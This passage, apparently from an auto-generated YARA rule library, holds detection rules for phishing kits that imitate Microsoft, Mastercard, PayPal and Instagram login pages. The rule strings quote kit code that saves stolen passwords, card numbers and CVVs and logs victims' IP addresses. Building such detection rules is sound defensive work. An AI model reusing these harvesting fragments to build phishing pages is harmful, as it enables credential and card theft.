      $s18 = "er your password, <a id=\"idA_IL_ForgotPassword0\" href=\"\">reset it now.</a>',e.CT_IHL_STR_Error_WrongHip='Enter your password" ascii /* score: '15.00'*/
      $s19 = "mail address, phone number, or Skype name.\",e.CT_PWD_STR_Error_GetCredentialTypeError=\"There was an issue looking up your acco" ascii /* score: '15.00'*/
      $s20 = "STR_Error_OldSkypePwd=\"Your old Skype password doesn't work anymore. Try the password for your Microsoft account.\",e.CT_PWD_ST" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule Converged_v21033 {
   meta:
      description = "phish__microsoft - file Converged_v21033.css"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "4e9e7c1c2df9e91cf271a7afe529360d199cdff23a721473062ee1ebabd6821f"
   strings:
      $x1 = "html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcapti" ascii /* score: '70.00'*/
      $s2 = "x}.row:before,.row:after{content:\" \";display:table}.row:after{clear:both}.col-xs-1,.col-sm-1,.col-md-1,.col-lg-1,.col-xs-2,.co" ascii /* score: '18.00'*/
      $s3 = "s-error,input[type=\"month\"]:focus.has-error,input[type=\"number\"]:focus.has-error,input[type=\"password\"]:focus.has-error,in" ascii /* score: '18.00'*/
      $s4 = "password\"],input[type=\"password\"].has-error,.form-group.has-error input[type=\"search\"],input[type=\"search\"].has-error,.fo" ascii /* score: '18.00'*/
      $s5 = ");pointer-events:none}.btn-group:before,.btn-group:after{content:\" \";display:table}.btn-group:after{clear:both}.btn-group .btn" ascii /* score: '18.00'*/
      $s6 = "lor.input-group-addon.has-error,label.input-group-addon.has-error{border-color:#e81123}.bold{font-weight:600}.modal-header h4.Us" ascii /* score: '18.00'*/
      $s7 = "ImageTransform.Microsoft.Alpha(Opacity=50)\";filter:alpha(opacity=50);z-index:50000}body.cb .modalDialogContainer{position:fixed" ascii /* score: '17.00'*/
      $s8 = "content,body #c_content{margin:0 auto}body #maincontent{width:90%;min-height:400px}.ltr_override,.dirltr{direction:ltr}label.lab" ascii /* score: '17.00'*/
      $s9 = "arnMore{white-space:nowrap}body.cb .modalDialogContent{width:100%;position:relative;margin:0 auto}body.cb .img-centipede{width:1" ascii /* score: '17.00'*/
      $s10 = "4px solid;content:\"\"}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:1" ascii /* score: '17.00'*/
      $s11 = "tion:checked{background-color:#fff!important}.IE_M8 select{background-color:#fff!important}body.IE_M7.rtl{font-family:\"Segoe UI" ascii /* score: '16.00'*/
      $s12 = "al-content{padding:16px}.modal p:first-child{margin-top:0}.modal .btn{width:calc(50% - 2px)}.modal .btn:last-child{margin-right:" ascii /* score: '16.00'*/
      $s13 = "cc;padding:5px 8px 7px 8px;max-width:320px}.clearfix:before,.clearfix:after{content:\" \";display:table}.clearfix:after{clear:bo" ascii /* score: '15.00'*/
      $s14 = "cb .modalDialogOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background-color:#000;opacity:.5;-ms-filter:\"progid:D" ascii /* score: '15.00'*/
      $s15 = "75,M22=.7071067811865476);-ms-filter:\"progid:DXImageTransform.Microsoft.Matrix(SizingMethod='auto expand', M11=0.70710678118654" ascii /* score: '15.00'*/
      $s16 = "ontainer:before,.container:after,.container-fluid:before,.container-fluid:after{content:\" \";display:table}.container:after,.co" ascii /* score: '15.00'*/
      $s17 = "modal-footer:before,.modal-footer:after{content:\" \";display:table}.modal-footer:after{clear:both}.modal-scrollbar-measure{posi" ascii /* score: '15.00'*/
      $s18 = "solid rgba(0,0,0,.4);min-width:320px}.new-session-popup .content{line-height:16px}.new-session-popup .content>*{word-wrap:break-" ascii /* score: '15.00'*/
      $s19 = "[type=\"password\"][disabled],input[type=\"password\"][readonly],fieldset[disabled] input[type=\"password\"],input[type=\"search" ascii /* score: '15.00'*/
      $s20 = "ImageTransform.Microsoft.gradient(enabled=false);cursor:not-allowed}.open>.dropdown-menu{display:block}.open>a{outline:0}.dropdo" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_index {
   meta:
      description = "phish__microsoft - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_login_2 {
   meta:
      description = "phish__microsoft - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "431b50f87b1319bee6aeb8d0bef6d3680d9d97c92b330cd73342685a0fac7361"
   strings:
      $x1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['loginfmt'] . \" Pass: \" . $_POST['passwd'] . \"\\n\", FILE_APPEND)" ascii /* score: '32.00'*/
      $s2 = "header('Location: https://microsoft.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_ip {
   meta:
      description = "phish__microsoft - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s10 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__mastercard_russia/phish__mastercard_russia_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__mastercard_russia
   Reference: phish__mastercard_russia phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__mastercard_russia_home_ubuntu_malware_lab_samples_extracted_phishing_Mastercard__Russia__css_custom {
   meta:
      description = "phish__mastercard_russia - file custom.css"
      author = "Comps Team Malware Lab"
      reference = "phish__mastercard_russia phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d10f52ecf026e639d446691c1f2ccc32f637c1077a17e8f1ce5131dc4fc8cb3a"
   strings:
      $s1 = ".head_cvv img {" fullword ascii /* score: '9.00'*/
      $s2 = ".modal-header {" fullword ascii /* score: '9.00'*/
      $s3 = ".modal-content {" fullword ascii /* score: '9.00'*/
      $s4 = ".head_cvv {" fullword ascii /* score: '9.00'*/
      $s5 = "-webkit-transition: -webkit-transform 300ms cubic-bezier(0.195, 1.29, 0.795, 1.36);" fullword ascii /* score: '8.00'*/
      $s6 = "-webkit-transition: -webkit-transform 250ms cubic-bezier(0.195, 1.29, 0.795, 1.36);" fullword ascii /* score: '8.00'*/
      $s7 = "display: -ms-flexbox;" fullword ascii /* score: '8.00'*/
      $s8 = "transition: -webkit-transform 250ms cubic-bezier(0.195, 1.29, 0.795, 1.36);" fullword ascii /* score: '8.00'*/
      $s9 = "transition: -webkit-transform 300ms cubic-bezier(0.195, 1.29, 0.795, 1.36);" fullword ascii /* score: '8.00'*/
      $s10 = "src: url('FuturaPT-Medium.eot?#iefix') format('embedded-opentype')," fullword ascii /* score: '7.00'*/
      $s11 = "background: url(/img/link_right_black.png) no-repeat;" fullword ascii /* score: '7.00'*/
      $s12 = "outline: none !important;" fullword ascii /* score: '7.00'*/
      $s13 = "src: url('FuturaPT-Medium.eot');" fullword ascii /* score: '7.00'*/
      $s14 = "url('FuturaPT-Medium.ttf') format('truetype');" fullword ascii /* score: '7.00'*/
      $s15 = ".arrow {" fullword ascii /* score: '4.00'*/
      $s16 = "transition: transform 300ms cubic-bezier(0.195, 1.29, 0.795, 1.36),-webkit-transform 300ms cubic-bezier(0.195, 1.29, 0.795, 1.36" ascii /* score: '4.00'*/
      $s17 = "border-top: #dbdcde 1px solid;" fullword ascii /* score: '4.00'*/
      $s18 = "border-top: #33c3c5 3px solid;" fullword ascii /* score: '4.00'*/
      $s19 = " Chezz, " fullword ascii /* score: '4.00'*/
      $s20 = "margin: 0 0 0 14px;" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 20KB and
      8 of them
}

rule _opt_mal_phish__mastercard_russia_home_ubuntu_malware_lab_samples_extracted_phishing_Mastercard__Russia__token {
   meta:
      description = "phish__mastercard_russia - file token.php"
      author = "Comps Team Malware Lab"
      reference = "phish__mastercard_russia phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "b2d278ed1e7ea79366109ba7001b927fdedca1cb12c91542787dc104a2a2b329"
   strings:
      $s1 = "7658222021502155" ascii /* score: '17.00'*/ /* hex encoded string 'vX" !P!U' */
      $s2 = ": 7658222021502155, " fullword ascii /* score: '9.00'*/ /* hex encoded string 'vX" !P!U' */
      $s3 = ":1111, CVV:111 " fullword ascii /* score: '1.00'*/
      $s4 = "<br> 1213456795452121:2121:323 " fullword ascii /* score: '1.00'*/
      $s5 = "123131231231231" ascii /* score: '1.00'*/
      $s6 = "<br> 323213123131:3123: " fullword ascii /* score: '1.00'*/
      $s7 = ": 1111111111111111, " fullword ascii /* score: '1.00'*/
      $s8 = ":1220, CVV:869 " fullword ascii /* score: '1.00'*/
      $s9 = "<br> 123131231231231:1313 " fullword ascii /* score: '1.00'*/
      $s10 = "323213123131" ascii /* score: '1.00'*/
      $s11 = "1213456795452121" ascii /* score: '1.00'*/
      $s12 = ": 111111111111111, " fullword ascii /* score: '1.00'*/
      $s13 = ": 111111, " fullword ascii /* score: '1.00'*/
      $s14 = ":, CVV: " fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 1KB and
      8 of them
}

rule _opt_mal_phish__mastercard_russia_home_ubuntu_malware_lab_samples_extracted_phishing_Mastercard__Russia__index {
   meta:
      description = "phish__mastercard_russia - file index.html"
      author = "Comps Team Malware Lab"
      reference = "phish__mastercard_russia phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "781dcfd1fb7086cb44e0a3872ff4b086472fc16b01796e5c03e1eda4b1734ef1"
   strings:
      $s1 = "<form method=\"post\" name=\"log\" id=\"login\" action=\"entercard.php\">" fullword ascii /* score: '19.00'*/
      $s2 = "<a href=\"#\" class=\"link_arrow\" data-toggle=\"modal\" data-target=\"#operations\">" fullword ascii /* score: '15.00'*/
      $s3 = "<script src=\"js/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" ascii /* score: '13.00'*/
      $s4 = "<div class=\"modal fade\" id=\"operations\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalCenterTitle\" aria-hid" ascii /* score: '13.00'*/
      $s5 = "<script src=\"js/popper.min.js\" integrity=\"sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1\" crossorig" ascii /* score: '13.00'*/
      $s6 = "<script src=\"js/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" ascii /* score: '13.00'*/
      $s7 = "<script src=\"js/popper.min.js\" integrity=\"sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1\" crossorig" ascii /* score: '13.00'*/
      $s8 = "<script src=\"js/bootstrap.min.js\" integrity=\"sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\" crosso" ascii /* score: '13.00'*/
      $s9 = "<script src=\"js/bootstrap.min.js\" integrity=\"sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\" crosso" ascii /* score: '13.00'*/
      $s10 = "<div class=\"modal fade\" id=\"operations\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalCenterTitle\" aria-hid" ascii /* score: '13.00'*/
      $s11 = "<a href=\"#\" class=\"button_cvv\" data-toggle=\"modal\" data-target=\"#entercard\">" fullword ascii /* score: '10.00'*/
      $s12 = "n=\"anonymous\"></script>" fullword ascii /* score: '10.00'*/
      $s13 = "ossorigin=\"anonymous\"></script>" fullword ascii /* score: '10.00'*/
      $s14 = "anonymous\"></script>" fullword ascii /* score: '10.00'*/
      $s15 = "<div class=\"modal fade\" id=\"entercard\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalCenterTitle\" aria-hidd" ascii /* score: '8.00'*/
      $s16 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">" fullword ascii /* score: '8.00'*/
      $s17 = "<img src=\"img/logo.png\" alt=\"mastercard\">" fullword ascii /* score: '8.00'*/
      $s18 = "<link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9J" ascii /* score: '7.00'*/
      $s19 = "<link href=\"css/custom.css\" rel=\"stylesheet\">" fullword ascii /* score: '7.00'*/
      $s20 = "<link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9J" ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      8 of them
}

rule _opt_mal_phish__mastercard_russia_home_ubuntu_malware_lab_samples_extracted_phishing_Mastercard__Russia__autor {
   meta:
      description = "phish__mastercard_russia - file autor.txt"
      author = "Comps Team Malware Lab"
      reference = "phish__mastercard_russia phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "3e47f4fdadca978cf9f41232cfd56708883d2a61cdcb9f38ec83d929a9d689ac"
   strings:
      $s1 = ": @bsixdfour;" fullword ascii /* score: '4.00'*/
      $s2 = " B6D4, " fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__mastercard_russia_home_ubuntu_malware_lab_samples_extracted_phishing_Mastercard__Russia__ыфыа {
   meta:
      description = "phish__mastercard_russia - file ыфыа.txt"
      author = "Comps Team Malware Lab"
      reference = "phish__mastercard_russia phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "97e6a34d7bd2ffe869b443307198681ba5f07b931485028dc4e5ababfe72f351"
   strings:
      $s1 = " token.php;" fullword ascii /* score: '10.00'*/
      $s2 = " index.html (" fullword ascii /* score: '4.00'*/
      $s3 = " input);" fullword ascii /* score: '4.00'*/
      $s4 = " entercard.php " fullword ascii /* score: '3.00'*/
   condition:
      uint16(0) == 0xe0c4 and filesize < 1KB and
      all of them
}

rule entercard {
   meta:
      description = "phish__mastercard_russia - file entercard.php"
      author = "Comps Team Malware Lab"
      reference = "phish__mastercard_russia phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e1384a28222ac0a23f528bdd2c16343bf62584c606b0cc83bb8ef5ec7bb811a5"
   strings:
      $s1 = "$log = fopen(\"token.php\",\"a+\");" fullword ascii /* score: '15.00'*/
      $s2 = "echo \"<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.mastercard.ru'></head></html>\";" fullword ascii /* score: '13.00'*/
      $s3 = "$Year = $_POST['year'];" fullword ascii /* score: '9.00'*/
      $s4 = "$Cvv = $_POST['cvv'];" fullword ascii /* score: '9.00'*/
      $s5 = "fwrite($log,\"<br> " fullword ascii /* score: '9.00'*/
      $s6 = "$Number = $_POST['number'];" fullword ascii /* score: '9.00'*/
      $s7 = ": $Number, " fullword ascii /* score: '4.00'*/
      $s8 = ":$Year, CVV:$Cvv \\n\"); " fullword ascii /* score: '4.00'*/
      $s9 = "fclose($log);" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__paypal/phish__paypal_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__paypal
   Reference: phish__paypal phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__paypal_home_ubuntu_malware_lab_samples_extracted_phishing_PayPal_index {
   meta:
      description = "phish__paypal - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__paypal phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__paypal_home_ubuntu_malware_lab_samples_extracted_phishing_PayPal_login {
   meta:
      description = "phish__paypal - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__paypal phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "6bdd929e258914d407095b516a51e9cd94817dfed88bad7fd9524d7464d321a8"
   strings:
      $x1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['login_email'] . \" Pass: \" . $_POST['login_password'] . \"\\n\", F" ascii /* score: '32.00'*/
      $x2 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['login_email'] . \" Pass: \" . $_POST['login_password'] . \"\\n\", F" ascii /* score: '32.00'*/
      $s3 = "header('Location: https://www.paypal.com/login');" fullword ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__paypal_home_ubuntu_malware_lab_samples_extracted_phishing_PayPal_login_2 {
   meta:
      description = "phish__paypal - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__paypal phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "750de8d980931515d7127f23563306335569c8626df09a59335a8eaec2c867eb"
   strings:
      $x1 = "</script><script nonce=\"OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN\">window.PAYPAL=window.PAYPAL||{},function(){\"use str" ascii /* score: '76.00'*/
      $x2 = "<!DOCTYPE html><!--[if lt IE 9]><html lang=\"en\" class=\"no-js lower-than-ie9 ie desktop\"><![endif]--><!--[if lt IE 10]><html " ascii /* score: '61.00'*/
      $x3 = "aria-describedby=\"passwordErrorMessage\"/><button type=\"button\" class=\"showPassword hide show-hide-password scTrack:unifiedl" ascii /* score: '54.00'*/
      $x4 = "</script><style id=\"antiClickjack\">body {display: none !important;}</style><script nonce=\"OdHJON702gbbVy4cAFWxaboMpVOk5muI1jh" ascii /* score: '52.00'*/
      $x5 = "</script><script src=\"https://www.paypalobjects.com/pa/js/min/pa.js\"></script><script nonce=\"OdHJON702gbbVy4cAFWxaboMpVOk5muI" ascii /* score: '49.00'*/
      $x6 = "</p><p class=\"secureMessage hide\">Securely logging you in...</p><p class=\"oneTouchMessage hide\"></p><p class=\"retrieveInfo " ascii /* score: '48.00'*/
      $x7 = "ger.logServerPreparedMetrics(),r||(login.logger.log({evt:\"state_name\",data:login.utils.getKmliCb()?\"LOGIN_UL_RM\":\"LOGIN_UL" ascii /* score: '41.00'*/
      $x8 = "e_name\",data:login.logger.getStateName(),instrument:!0}),login.logger.log({evt:\"transition_name\",data:\"process_password_reco" ascii /* score: '41.00'*/
      $x9 = "ogger.log({evt:\"state_name\",data:\"sso_login\",instrument:!0}),login.logger.log({evt:\"transition_name\",data:\"process_sso_lo" ascii /* score: '39.00'*/
      $x10 = "rn function(l){l.preventDefault(),login.logger.log({evt:\"state_name\",data:t||login.logger.getStateName(),instrument:!0}),login" ascii /* score: '38.00'*/
      $x11 = ",instrument:!0}),login.utils.getIntent()===\"checkout\"&&(login.logger.log({evt:\"landing_page\",data:\"login\",instrument:!0})," ascii /* score: '38.00'*/
      $x12 = "&a&&a.field&&(r=et(a)),r&&(w===\"inputEmail\"||w===\"inputPhone\")&&(login.logger.log({evt:\"state_name\",data:login.logger.getS" ascii /* score: '38.00'*/
      $x13 = "me(),instrument:!0}),login.logger.log({evt:\"transition_name\",data:\"process_next\",instrument:!0}),login.logger.pushLogs());if" ascii /* score: '36.00'*/
      $x14 = "logger.log({evt:\"design\",data:login.utils.isInContextIntegration()?\"in-context\":\"full-context\",instrument:!0})),i&&login.l" ascii /* score: '36.00'*/
      $x15 = "\"),n.aPayAuth=null,e.error_code&&login.logger.log({evt:\"ext_error_code\",data:e.error_code,instrument:!0});if(t){instrumentSpl" ascii /* score: '36.00'*/
      $x16 = "{data:{splitLoginOptOut:!0}})),login.logger.pushLogs(f),r()}}function a(e,t){eventPreventDefault(e),$.ajax({type:\"POST\",url:\"" ascii /* score: '35.00'*/
      $x17 = "ogger.log({evt:\"transition_name\",data:n,instrument:!0}),u=document.querySelector('input[name=\"locale.x\"]'),u&&login.logger.l" ascii /* score: '35.00'*/
      $x18 = "re_sso_login\",instrument:!0}),login.logger.pushLogs(),$.ajax({url:\"/signin/sso\",method:\"POST\",data:r,success:function(t){lo" ascii /* score: '35.00'*/
      $x19 = "opt\",login.logger.log({evt:\"exp_shown\",data:\"tpd\",instrument:!0})),login.logger.log({evt:\"state_name\",data:\"begin_pwd\"," ascii /* score: '33.00'*/
      $x20 = "ign\",data:login.utils.isInContextIntegration()?\"in-context\":\"full-context\",instrument:!0}),n&&login.logger.log({evt:\"page_" ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 300KB and
      1 of ($x*)
}

rule _opt_mal_phish__paypal_home_ubuntu_malware_lab_samples_extracted_phishing_PayPal_ip {
   meta:
      description = "phish__paypal - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__paypal phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__insta_followers/phish__insta_followers_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__insta_followers
   Reference: phish__insta_followers phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login_files_scripts {
   meta:
      description = "phish__insta_followers - file scripts.js"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "481d3573e0d44ca93371539973a317eaaf61adbb3a06b11b1b71d944122fd9f8"
   strings:
      $s1 = "      // console.log($(target).offset().top)" fullword ascii /* score: '21.00'*/
      $s2 = " * License: https://wrapbootstrap.com/help/licenses" fullword ascii /* score: '21.00'*/
      $s3 = "  console.log('Site is in '+(modeRTL?'RTL':'LTR')+' mode.');" fullword ascii /* score: '16.00'*/
      $s4 = "  $loaders.on('click', function (e) {" fullword ascii /* score: '13.00'*/
      $s5 = "  var $loaders = $('[data-load-css]');" fullword ascii /* score: '13.00'*/
      $s6 = "  if (typeof $ === 'undefined') { throw new Error('This site\\'s JavaScript requires jQuery'); }" fullword ascii /* score: '13.00'*/
      $s7 = "  // Site Preloader" fullword ascii /* score: '13.00'*/
      $s8 = "          'scrollTop': $(target).offset().top" fullword ascii /* score: '12.00'*/
      $s9 = " * Angle - Bootstrap Admin App" fullword ascii /* score: '12.00'*/
      $s10 = "      var target = this.hash;" fullword ascii /* score: '12.00'*/
      $s11 = " * Author: @themicon_co" fullword ascii /* score: '11.00'*/
      $s12 = " * Version: 3.7.5" fullword ascii /* score: '11.00'*/
      $s13 = " * Website: http://themicon.co" fullword ascii /* score: '11.00'*/
      $s14 = "  modeRTL = !!$.localStorage.get('modeRTL');" fullword ascii /* score: '11.00'*/
      $s15 = "  /* -----------------------------------" fullword ascii /* score: '9.00'*/
      $s16 = "// ----------------------------------- " fullword ascii /* score: '9.00'*/
      $s17 = "  $('#header').waitForImages(function() {" fullword ascii /* score: '9.00'*/
      $s18 = "  $win.scroll(stickyNavScroll);" fullword ascii /* score: '8.00'*/
      $s19 = "  // get mode from local storage" fullword ascii /* score: '8.00'*/
      $s20 = "          window.location.hash = target;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 20KB and
      8 of them
}

rule otherscript {
   meta:
      description = "phish__insta_followers - file otherscript.js"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "21a3c03ce64eec4fb9204581216e2f6add5a9bac392995fc685d3af415abc5ec"
   strings:
      $s1 = "                        flash.alert(alerts, 'danger', 'Login Failed! you need to activate your account using our android app., <" ascii /* score: '25.00'*/
      $s2 = "                        flash.alert(alerts, 'danger', 'Your account is deactivated. To reactivate account login into our android" ascii /* score: '22.00'*/
      $s3 = " app., <a href=\"'+data.verify_url+'\" class=\"app-link\" target=\"_blank\">click here</a> to download android app.', '<p></p>')" ascii /* score: '16.00'*/
      $s4 = "a href=\"'+data.verify_url+'\" class=\"app-link\" target=\"_blank\">click here</a> to download our app.', '<p></p>').delay(50000" ascii /* score: '16.00'*/
      $s5 = "            url: '/login.php'," fullword ascii /* score: '13.00'*/
      $s6 = "                        $('form.ajax[data-action=\"instagram_login\"] input[name=\"username\"], input[name=\"password\"]').val('" ascii /* score: '13.00'*/
      $s7 = "                        flash.alert(alerts, 'danger', 'Login Failed! you need to activate your account using our android app., <" ascii /* score: '13.00'*/
      $s8 = "                    flash.alert(alerts, 'danger', 'Unknown error occured, please reload the page and login again.', '');" fullword ascii /* score: '13.00'*/
      $s9 = "                        $('form.ajax[data-action=\"instagram_login\"] input[name=\"password\"]').val('').focus();" fullword ascii /* score: '13.00'*/
      $s10 = "                        $('form.ajax[data-action=\"instagram_login\"] input[name=\"username\"], input[name=\"password\"]').val('" ascii /* score: '13.00'*/
      $s11 = "                flash.alert(alerts, 'danger', 'Unknown error occured, please reload the page and login again.', '');" fullword ascii /* score: '13.00'*/
      $s12 = "        var submit = $('form.ajax[data-action=\"instagram_login\"] button[type=\"submit\"]');" fullword ascii /* score: '10.00'*/
